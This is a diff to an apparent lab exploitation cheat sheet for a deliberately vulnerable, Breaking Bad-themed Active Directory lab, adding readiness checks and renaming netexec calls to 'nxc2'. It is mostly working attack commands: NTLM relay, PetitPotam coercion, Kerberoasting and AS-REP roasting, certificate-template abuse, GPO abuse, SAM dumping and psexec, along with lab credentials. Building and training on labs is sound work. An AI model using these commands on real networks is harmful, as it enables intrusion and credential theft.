@@ -15,6 +15,41 @@ Quick reference for exploiting all 12 vulnerabilities in the lab.
 
 ---
 
+## Quick Verification (Demo Setup)
+
+Run these to verify the lab is ready:
+
+```bash
+# Verify connectivity to all machines
+nxc2 smb 192.168.100.10 192.168.100.20 192.168.100.21 -u walter.white -p '774azeG!'
+
+# Check ADCS web enrollment is up (vuln 01)
+curl -sk https://192.168.100.10/certsrv/ | grep -q "Microsoft Active Directory Certificate Services" && echo "ESC8: OK"
+
+# Check WebClient on srv02 (vuln 03)
+nxc2 smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
+
+# Check password in description (vuln 07)
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
+
+# Check Kerberoastable users (vuln 08)
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting /dev/null
+
+# Check ASREProastable users (vuln 09)
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast /dev/null
+
+# Check vulnerable ADCS templates (vuln 10)
+certipy find -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.10 -vulnerable -stdout 2>/dev/null | grep -E "Template Name|ESC1"
+
+# Check anonymous LDAP (vuln 11)
+nxc2 ldap 192.168.100.10 -u '' -p '' --users 2>&1 | head -5
+
+# Check shared local admin (vuln 12)
+nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
+```
+
+---
+
 ## 01 - ESC8 (ADCS Web Enrollment)
 
 **Target:** dc01 | **What:** NTLM relay to the ADCS HTTP enrollment endpoint to get a certificate as any user.
@@ -41,7 +76,7 @@ certipy auth -pfx dc01.pfx -dc-ip 192.168.100.10
 responder -I eth0 -v
 
 # Or use netexec to check the LM compatibility level
-nxc smb 192.168.100.20 -u walter.white -p '774azeG!' --laps
+nxc2 smb 192.168.100.20 -u walter.white -p '774azeG!' --laps
 
 # Crack NTLMv1 hashes (submit to crack.sh or use hashcat)
 # NTLMv1 with ESS can be converted to a crackable format at https://crack.sh
@@ -56,7 +91,7 @@ hashcat -m 14000 ntlmv1_hash.txt wordlist.txt
 
 ```bash
 # Verify WebClient is running
-nxc smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
+nxc2 smb 192.168.100.21 -u walter.white -p '774azeG!' -M webdav
 
 # Coerce authentication via WebDAV (PetitPotam over HTTP)
 PetitPotam.py -u walter.white -p '774azeG!' -d breakingbad.local attacker@80/test 192.168.100.21
@@ -73,20 +108,20 @@ ntlmrelayx.py -t ldap://192.168.100.10 -smb2support
 
 ```bash
 # Enumerate GPO permissions
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse
 
 # Check with BloodHound
 bloodhound-python -u walter.white -p '774azeG!' -d breakingbad.local -dc dc01.breakingbad.local -c all
 
 # Abuse with pyGPOAbuse (add local admin or reverse shell)
-pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
+pygpoabuse.py breakingbad.local/walter.white:'774azeG!' -gpo-id "$(nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M gpo_abuse 2>&1 | grep -oP '{[^}]+}')" \
   -command 'net localgroup Administrators walter.white /add' -taskname 'update' -f
 
 # Or use SharpGPOAbuse from Windows
 SharpGPOAbuse.exe --AddLocalAdmin --UserAccount walter.white --GPOName "Los Pollos Hermanos"
 
 # Force gpupdate on target (or wait)
-nxc smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
+nxc2 smb 192.168.100.20 -u walter.white -p '774azeG!' -x 'gpupdate /force'
 ```
 
 ---
@@ -134,7 +169,7 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 ```bash
 # Query with netexec
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' -M get-desc-users
 
 # Query with ldapsearch
 ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '774azeG!' \
@@ -144,7 +179,7 @@ ldapsearch -x -H ldap://192.168.100.10 -D 'walter.white@breakingbad.local' -w '7
 rpcclient -U 'walter.white%774azeG!' 192.168.100.10 -c 'queryuser saul.goodman'
 
 # Verify the password works
-nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
+nxc2 smb 192.168.100.10 -u saul.goodman -p '657crsH!'
 ```
 
 ---
@@ -155,7 +190,7 @@ nxc smb 192.168.100.10 -u saul.goodman -p '657crsH!'
 
 ```bash
 # Find kerberoastable users
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting kerberoast.txt
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --kerberoasting kerberoast.txt
 
 # Or with impacket
 GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -request
@@ -164,7 +199,7 @@ GetUserSPNs.py breakingbad.local/walter.white:'774azeG!' -dc-ip 192.168.100.10 -
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 
 # Verify cracked password
-nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
+nxc2 smb 192.168.100.10 -u hector.salamanca -p '346modL!'
 ```
 
 ---
@@ -175,7 +210,7 @@ nxc smb 192.168.100.10 -u hector.salamanca -p '346modL!'
 
 ```bash
 # Find users without pre-auth
-nxc ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast asrep.txt
+nxc2 ldap 192.168.100.10 -u walter.white -p '774azeG!' --asreproast asrep.txt
 
 # Or with impacket (no creds needed if you know the username)
 GetNPUsers.py breakingbad.local/jessie.pinkman -dc-ip 192.168.100.10 -no-pass -format hashcat
@@ -187,7 +222,7 @@ GetNPUsers.py breakingbad.local/ -dc-ip 192.168.100.10 -usersfile users.txt -no-
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 
 # Verify cracked password
-nxc smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
+nxc2 smb 192.168.100.10 -u jessie.pinkman -p '313lksV!'
 ```
 
 ---
@@ -209,7 +244,7 @@ certipy req -u walter.white@breakingbad.local -p '774azeG!' -dc-ip 192.168.100.1
 certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10
 
 # Use the NT hash to access the DC
-nxc smb 192.168.100.10 -u Administrator -H <nthash> --shares
+nxc2 smb 192.168.100.10 -u Administrator -H <nthash> --shares
 ```
 
 ---
@@ -220,7 +255,7 @@ nxc smb 192.168.100.10 -u Administrator -H <nthash> --shares
 
 ```bash
 # Enumerate users without credentials
-nxc ldap 192.168.100.10 -u '' -p '' --users
+nxc2 ldap 192.168.100.10 -u '' -p '' --users
 
 # Enumerate with ldapsearch (anonymous bind)
 ldapsearch -x -H ldap://192.168.100.10 -b 'DC=breakingbad,DC=local' '(objectClass=user)' sAMAccountName description
@@ -240,13 +275,13 @@ enum4linux-ng -A 192.168.100.10
 
 ```bash
 # Verify creds work on both servers
-nxc smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
+nxc2 smb 192.168.100.20 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth
 
 # Dump SAM on srv01
-nxc smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam
+nxc2 smb 192.168.100.20 -u svc_admin -p 'Zomer123!' --local-auth --sam
 
 # Use same creds to move to srv02
-nxc smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'
+nxc2 smb 192.168.100.21 -u svc_admin -p 'Zomer123!' --local-auth -x 'whoami'
 
 # Or get a shell with psexec
 psexec.py svc_admin:'Zomer123!'@192.168.100.20
